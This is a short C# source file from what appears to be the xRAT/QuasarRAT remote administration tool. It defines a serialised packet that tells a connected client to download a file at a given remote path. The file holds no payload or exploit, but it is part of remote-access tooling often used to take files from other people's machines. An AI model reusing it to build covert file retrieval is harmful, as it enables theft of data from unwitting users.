using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoDownloadFile : IPacket
    {
        [ProtoMember(1)]
        public string RemotePath { get; set; }

        [ProtoMember(2)]
        public int ID { get; set; }

        public DoDownloadFile()
        {
        }

        public DoDownloadFile(string remotepath, int id)
        {
            this.RemotePath = remotepath;
            this.ID = id;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}